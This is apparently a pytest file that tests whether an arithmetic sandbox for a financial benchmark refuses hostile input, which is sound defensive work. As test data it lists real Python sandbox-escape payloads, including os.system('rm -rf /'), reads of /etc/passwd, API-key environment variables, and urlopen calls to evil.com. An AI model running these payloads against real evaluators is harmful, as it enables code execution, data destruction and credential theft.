"""Adversarial tests against the arithmetic sandbox. A sandbox escape here is a test failure, not a
footnote.

A model under evaluation is an untrusted input source. It has no goals, so it is not an attacker in
the usual sense — but it emits text, that text becomes an expression, and something has to run it.
The difference between "a model hallucinated a weird string" and "an attacker" vanishes entirely at
the point where you call `eval()` on it.

And a financial agent is worse than the usual case, because the DATA is untrusted too: an invoice
description, a transaction memo, a supplier's line item. If a ledger row can reach the evaluator, the
attacker is whoever can add a row to the ledger.

Every payload below is a real, published sandbox-escape technique. The sandbox does not block them
individually — a blacklist is a list of the attacks you happened to think of. It refuses every AST
node that is not arithmetic, and every one of these needs a `Name` or an `Attribute` node to work.
"""

from __future__ import annotations

import pytest

from financebench.tools.sandbox import MAX_EXPRESSION_CHARS, SandboxError, safe_eval

# --------------------------------------------------------------------------- it must still compute


@pytest.mark.parametrize(
    ("expression", "expected"),
    [
        ("2 + 2", "4"),
        ("(1500 - 1200) / 1200 * 100", "25.00"),
        ("abs(-1577)", "1577"),
        ("max(3, 7, 5)", "7"),
        ("-42 + 100", "58"),
        ("2 ** 10", "1024"),
    ],
)
def test_the_sandbox_still_does_arithmetic(expression: str, expected: str) -> None:
    assert str(safe_eval(expression).value) == expected


def test_arithmetic_is_decimal_not_float() -> None:
    """This is a financial tool. `0.1 + 0.2 != 0.3` in binary floating point, and a benchmark that
    grades a model against a number its own calculator got subtly wrong is grading its own rounding
    error."""
    assert str(safe_eval("0.1 + 0.2").value) == "0.3"
    assert safe_eval("0.1 + 0.2").value == safe_eval("0.3").value


# --------------------------------------------------------------------------- code execution


@pytest.mark.parametrize(
    "payload",
    [
        # The classics. Every one of these is a real published escape.
        "__import__('os').system('ls')",
        "__import__('subprocess').run(['sh'])",
        "().__class__.__bases__[0].__subclasses__()",
        "().__class__.__mro__[1].__subclasses__()",
        "(lambda: __import__('os'))()",
        "[].__class__.__base__.__subclasses__()",
        "getattr(__builtins__, 'eval')('1+1')",
        "eval('1+1')",
        "exec('import os')",
        "compile('1', '', 'eval')",
        "globals()",
        "locals()",
        "vars()",
        "dir()",
        "open('/etc/passwd').read()",
        "__builtins__",
        "os.system('rm -rf /')",
        "type(1).__class__",
    ],
)
def test_code_execution_is_refused(payload: str) -> None:
    """Not blocked individually — *unparseable within the allow-list*. Every one of these needs a
    Name or an Attribute node, and neither is handled."""
    with pytest.raises(SandboxError):
        safe_eval(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "os.environ['OPENAI_API_KEY']",
        "os.environ.get('ANTHROPIC_API_KEY')",
        "__import__('os').environ",
    ],
)
def test_environment_variables_are_unreachable(payload: str) -> None:
    """The API keys are in this process's environment. A tool that could read them would exfiltrate
    them into a model's answer, and from there into a run artifact committed to a public repo."""
    with pytest.raises(SandboxError):
        safe_eval(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "open('../../etc/passwd')",
        "open('/proc/self/environ').read()",
        "__import__('pathlib').Path('/').glob('*')",
    ],
)
def test_the_filesystem_is_unreachable(payload: str) -> None:
    with pytest.raises(SandboxError):
        safe_eval(payload)


@pytest.mark.parametrize(
    "payload",
    [
        "__import__('urllib.request').urlopen('http://evil.com')",
        "__import__('socket').socket()",
        "__import__('httpx').get('http://evil.com')",
    ],
)
def test_the_network_is_unreachable(payload: str) -> None:
    with pytest.raises(SandboxError):
        safe_eval(payload)


# --------------------------------------------------------------------------- resource exhaustion


def test_a_huge_exponent_is_refused_before_it_allocates() -> None:
    """`2 ** 999999999` is a two-token denial of service: it parses instantly and allocates forever.
    A timeout is already too late — the allocation happens first — so the exponent is bounded, not
    the runtime."""
    with pytest.raises(SandboxError, match="exponent"):
        safe_eval("2 ** 999999999")
    with pytest.raises(SandboxError, match="exponent"):
        safe_eval("9 ** 9 ** 9")


def test_an_enormous_expression_is_refused_before_it_is_parsed() -> None:
    """`ast.parse` on a pathological input is itself the denial of service, so the bound comes first."""
    with pytest.raises(SandboxError, match="limit"):
        safe_eval("1+" * MAX_EXPRESSION_CHARS + "1")


def test_deep_nesting_is_refused() -> None:
    """Guards against a stack overflow in the tree walk.

    Note it must be tested with real nested operations, not bare parentheses: parentheses produce no
    AST node at all, so `((((1))))` has a depth of one. The first version of this test used parens and
    passed for the wrong reason — it was asserting nothing.
    """
    with pytest.raises(SandboxError, match="nested"):
        safe_eval("1+(" * 30 + "1" + ")" * 30)


def test_a_division_that_does_not_terminate_still_terminates() -> None:
    """1/3 has no finite decimal expansion. A fixed precision is what makes it stop."""
    value = str(safe_eval("1 / 3").value)
    assert value.startswith("0.333333")
    assert len(value) < 60


def test_round_to_two_places_works_because_a_model_will_ask_for_it_constantly() -> None:
    """It did not, at first: every argument in this sandbox is a Decimal, and Python's round() needs
    a real int for the digit count. The most-used tool call in the whole benchmark raised TypeError
    on every single invocation."""
    assert str(safe_eval("round(40.5467, 2)").value) == "40.55"
    assert str(safe_eval("round(1577.891)").value) == "1578"
    with pytest.raises(SandboxError, match="whole number"):
        safe_eval("round(1.23, 1.5)")


def test_division_by_zero_is_an_error_not_a_crash() -> None:
    with pytest.raises(SandboxError, match="division by zero"):
        safe_eval("1/0")


# --------------------------------------------------------------------------- smuggling


@pytest.mark.parametrize(
    "payload",
    [
        "'string'",
        '"__import__"',
        "f'{1}'",
        "[1, 2, 3]",
        "{1: 2}",
        "(1, 2)",
        "x",
        "x = 1",
        "lambda: 1",
        "[i for i in range(10)]",
        "1 if True else 2",
        "1 < 2",
        "True and False",
    ],
)
def test_anything_that_is_not_arithmetic_is_refused(payload: str) -> None:
    """A string constant is the only way to smuggle a payload into an arithmetic sandbox, and a
    calculator has no use for one. Names, subscripts, comprehensions and lambdas are the machinery
    every escape is built from."""
    with pytest.raises(SandboxError):
        safe_eval(payload)


def test_a_refusal_is_an_error_the_model_can_see_not_a_crash_of_the_harness() -> None:
    """The sandbox refusing is the sandbox WORKING. It must be reported back to the model as a tool
    error it can recover from — a model that gets refused and then adapts is demonstrating exactly
    what the tool benchmark exists to measure."""
    with pytest.raises(SandboxError) as exc:
        safe_eval("__import__('os')")
    message = str(exc.value).lower()
    assert "unknown function" in message or "not allowed" in message
    # And it names what it refused, so a model can adapt rather than guess.
    assert "__import__" in str(exc.value)
